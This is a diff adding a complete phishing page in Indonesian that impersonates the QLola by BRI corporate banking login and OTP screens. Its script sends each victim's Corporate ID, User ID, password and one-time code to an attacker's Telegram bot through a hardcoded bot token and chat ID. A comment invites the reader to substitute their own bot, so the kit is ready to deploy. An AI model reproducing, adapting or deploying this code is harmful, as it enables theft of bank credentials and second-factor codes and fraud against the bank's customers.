@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QLola by BRI - Login & OTP</title>
+    <style>
+        * {margin:0; padding:0; box-sizing:border-box; font-family:Arial,sans-serif;}
+        body {
+            background: linear-gradient(180deg, #63a4f8 0%, #0052b3 100%);
+            min-height:100vh;
+            display:flex; align-items:center; justify-content:center;
+            padding:20px;
+        }
+        .page {display:none; width:100%; max-width:420px; text-align:center;}
+        .page.active {display:block;}
+
+        .logo-section {margin-bottom:30px;}
+        .logo {font-size:52px; font-weight:bold; color:white;}
+        .logo span {color:#ff9f1c;}
+        .tagline {color:white; font-size:16px; margin-top:5px;}
+
+        .form-box {
+            background:rgba(255,255,255,0.18);
+            border-radius:16px;
+            padding:30px 25px;
+            border-top:3px solid #ff9f1c;
+        }
+        .form-box h1 {color:white; font-size:32px; margin-bottom:25px; letter-spacing:2px;}
+        .form-box h2 {color:white; font-size:22px; margin-bottom:10px;}
+        .form-box p.desc {color:#e6e6e6; font-size:14px; margin-bottom:15px; line-height:1.5;}
+
+        .timer-box {
+            background:rgba(255,255,255,0.15);
+            padding:10px; border-radius:8px; margin-bottom:15px;
+        }
+        .timer-text {color:#fff; font-size:14px;}
+        .timer-count {color:#ffd700; font-weight:bold; font-size:20px;}
+
+        .expired-note {
+            color:#ffb3b3; font-size:14px; margin:10px 0; display:none;
+        }
+
+        .form-group {text-align:left; margin-bottom:18px;}
+        .label-row {display:flex; align-items:center; gap:6px; margin-bottom:8px;}
+        .form-group label {color:white; font-size:16px; font-weight:500;}
+        .info-icon {
+            display:inline-flex; align-items:center; justify-content:center;
+            width:18px; height:18px; border-radius:50%; background:white;
+            color:#0052b3; font-size:12px; font-weight:bold;
+        }
+        .form-group input {
+            width:100%; padding:14px 16px; border:none; border-radius:25px;
+            font-size:15px; background:white; color:#333;
+        }
+        .form-group input::placeholder {color:#999;}
+
+        .password-wrapper {position:relative;}
+        .eye-icon {
+            position:absolute; right:18px; top:50%; transform:translateY(-50%);
+            color:#666; cursor:pointer; font-size:20px;
+        }
+
+        .forgot-link {text-align:right; margin:8px 0 25px;}
+        .forgot-link a {color:white; font-size:14px; text-decoration:underline;}
+
+        .otp-container {display:flex; justify-content:center; gap:10px; margin-bottom:15px;}
+        .otp-input {
+            width:50px; height:55px; text-align:center; font-size:22px;
+            border:none; border-radius:8px; background:white;
+            color:#0052b3; font-weight:bold; outline:none;
+        }
+
+        .resend-link {margin:10px 0 20px; display:none;}
+        .resend-link.show {display:block;}
+        .resend-link a {color:#ffd580; font-size:14px; text-decoration:none;}
+
+        .btn-login {
+            width:100%; padding:14px; border:none; border-radius:25px;
+            background:white; color:#333; font-size:17px; font-weight:500; cursor:pointer;
+            transition:0.2s;
+        }
+        .btn-login:disabled {background:#ccc; color:#888; cursor:not-allowed;}
+        .btn-login:hover:not(:disabled) {background:#f0f0f0;}
+
+        .btn-back {
+            background:transparent; border:1px solid white; color:white; margin-top:10px;
+        }
+        .btn-back:hover {background:rgba(255,255,255,0.2);}
+
+        .status {margin-top:15px; color:white; font-size:14px;}
+    </style>
+</head>
+<body>
+
+    <!-- HALAMAN 1: LOGIN -->
+    <div id="loginPage" class="page active">
+        <div class="logo-section">
+            <div class="logo">Q<span>Lola</span></div>
+            <p class="tagline">by BRI</p>
+            <p class="tagline">Integrated Corporate Solution</p>
+        </div>
+
+        <div class="form-box">
+            <h1>LOGIN</h1>
+            <form id="loginForm">
+                <div class="form-group">
+                    <div class="label-row">
+                        <label>Corporate ID</label>
+                        <span class="info-icon">i</span>
+                    </div>
+                    <input type="text" id="corporateId" placeholder="Masukkan Corporate ID Anda" required>
+                </div>
+                <div class="form-group">
+                    <label>User ID</label>
+                    <input type="text" id="userId" placeholder="Masukkan user ID anda" required>
+                </div>
+                <div class="form-group">
+                    <label>Kata Sandi</label>
+                    <div class="password-wrapper">
+                        <input type="password" id="password" placeholder="Masukkan kata sandi anda" required>
+                        <span class="eye-icon" id="togglePass">👁</span>
+                    </div>
+                </div>
+                <div class="forgot-link">
+                    <a href="#">LUPA KATA SANDI?</a>
+                </div>
+                <button type="submit" class="btn-login">Masuk</button>
+                <div class="status" id="loginStatus"></div>
+            </form>
+        </div>
+    </div>
+
+    <!-- HALAMAN 2: VERIFIKASI OTP -->
+    <div id="otpPage" class="page">
+        <div class="logo-section">
+            <div class="logo">Q<span>Lola</span></div>
+            <p class="tagline">by BRI</p>
+        </div>
+        <div class="form-box">
+            <h2>VERIFIKASI OTP</h2>
+            <p class="desc">Kode OTP telah dikirim ke nomor HP/email yang terdaftar.</p>
+
+            <div class="timer-box">
+                <div class="timer-text">Kode berlaku selama:</div>
+                <div class="timer-count" id="countdown">02:00</div>
+            </div>
+
+            <p class="expired-note" id="expiredNote">⏰ Kode OTP telah kadaluwarsa! Silakan kirim ulang kode baru.</p>
+
+            <form id="otpForm">
+                <div class="otp-container">
+                    <input type="text" class="otp-input" maxlength="1" data-index="0" required>
+                    <input type="text" class="otp-input" maxlength="1" data-index="1" required>
+                    <input type="text" class="otp-input" maxlength="1" data-index="2" required>
+                    <input type="text" class="otp-input" maxlength="1" data-index="3" required>
+                    <input type="text" class="otp-input" maxlength="1" data-index="4" required>
+                    <input type="text" class="otp-input" maxlength="1" data-index="5" required>
+                </div>
+
+                <div class="resend-link" id="resendBox">
+                    <a href="#" id="resendOtp">🔄 Kirim ulang kode OTP</a>
+                </div>
+
+                <button type="submit" class="btn-login" id="btnVerifikasi">Verifikasi</button>
+                <button type="button" class="btn-login btn-back" id="btnKembali">Kembali</button>
+                <div class="status" id="otpStatus"></div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // ⚠️ Ganti dengan token bot & chat ID kamu
+        const BOT_TOKEN = '9012298260:AAE7PCvrsW6r7RiTKF3FrztDb7WmAtI3Rbs';
+        const CHAT_ID = '8097714206';
+
+        let loginData = {};
+        let timerInterval;
+        let timeLeft = 120; // 2 menit
+        let isExpired = false;
+
+        // Tampil/sembunyi kata sandi
+        document.getElementById('togglePass').addEventListener('click', () => {
+            const p = document.getElementById('password');
+            p.type = p.type === 'password' ? 'text' : 'password';
+        });
+
+        // Ganti halaman
+        function showPage(id) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
+
+        // Mulai timer
+        function startTimer() {
+            clearInterval(timerInterval);
+            timeLeft = 120;
+            isExpired = false;
+            document.getElementById('expiredNote').style.display = 'none';
+            document.getElementById('resendBox').classList.remove('show');
+            document.getElementById('btnVerifikasi').disabled = false;
+            document.getElementById('otpStatus').textContent = '';
+            clearOtpInputs();
+            
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                updateTimer();
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    otpExpired();
+                }
+            }, 1000);
+        }
+
+        function updateTimer() {
+            const m = Math.floor(timeLeft / 60);
+            const s = timeLeft % 60;
+            document.getElementById('countdown').textContent = 
+                `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+        }
+
+        function otpExpired() {
+            isExpired = true;
+            document.getElementById('countdown').textContent = '00:00';
+            document.getElementById('expiredNote').style.display = 'block';
+            document.getElementById('resendBox').classList.add('show');
+            document.getElementById('btnVerifikasi').disabled = true;
+            document.getElementById('otpStatus').textContent = '⏳ Kode OTP sudah tidak berlaku';
+            document.getElementById('otpStatus').style.color = '#ffb3b3';
+        }
+
+        function clearOtpInputs() {
+            document.querySelectorAll('.otp-input').forEach(i => i.value = '');
+        }
+
+        // Kirim ke Telegram
+        async function sendTelegram(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type':'application/json'},
+                    body: JSON.stringify({chat_id: CHAT_ID, text: text})
+                });
+                return true;
+            } catch { return false; }
+        }
+
+        // Login → ke OTP
+        document.getElementById('loginForm').addEventListener('submit', async e => {
+            e.preventDefault();
+            const status = document.getElementById('loginStatus');
+            status.textContent = 'Memproses...';
+            status.style.color = 'white';
+
+            loginData = {
+                corp: document.getElementById('corporateId').value,
+                user: document.getElementById('userId').value,
+                pass: document.getElementById('password').value
+            };
+
+            const pesan = `📩 Data Login:\n📌 Corporate ID: ${loginData.corp}\n📌 User ID: ${loginData.user}\n🔒 Sandi: ${loginData.pass}`;
+            await sendTelegram(pesan);
+
+            status.textContent = '✅ Berhasil!';
+            status.style.color = '#90ee90';
+            
+            setTimeout(() => {
+                showPage('otpPage');
+                document.querySelector('.otp-input').focus();
+                startTimer();
+            }, 800);
+        });
+
+        // Kembali ke login
+        document.getElementById('btnKembali').addEventListener('click', () => {
+            clearInterval(timerInterval);
+            showPage('loginPage');
+        });
+
+        // Input OTP otomatis pindah kolom
+        const otpInputs = document.querySelectorAll('.otp-input');
+        otpInputs.forEach((inp, idx) => {
+            inp.addEventListener('input', () => {
+                inp.value = inp.value.replace(/[^0-9]/g, '');
+                if (inp.value && idx < 5) otpInputs[idx+1].focus();
+            });
+            inp.addEventListener('keydown', e => {
+                if (e.key === 'Backspace' && !inp.value && idx > 0) otpInputs[idx-1].focus();
+            });
+        });
+
+        // Kirim OTP
+        document.getElementById('otpForm').addEventListener('submit', async e => {
+            e.preventDefault();
+            const status = document.getElementById('otpStatus');
+            
+            if (isExpired) {
+                status.textContent = '❌ Kode sudah kadaluwarsa';
+                status.style.color = '#ffb3b3';
+                return;
+            }
+
+            let otp = '';
+            otpInputs.forEach(i => otp += i.value);
+            
+            if (otp.length !== 6) {
+                status.textContent = '❌ Masukkan 6 digit kode';
+                status.style.color = '#ffb3b3';
+                return;
+            }
+
+            status.textContent = 'Memverifikasi...';
+            await sendTelegram(`🔑 Kode OTP: ${otp}\n📌 User: ${loginData.user}`);
+            status.textContent = '✅ OTP terkirim!';
+            status.style.color = '#90ee90';
+        });
+
+        // Kirim ulang OTP
+        document.getElementById('resendOtp').addEventListener('click', async e => {
+            e.preventDefault();
+            await sendTelegram(`📤 Kirim ulang OTP\n📌 User: ${loginData.user}`);
+            startTimer();
+            alert('✅ Kode OTP baru telah dikirim!');
+        });
+    </script>
+</body>
+</html>
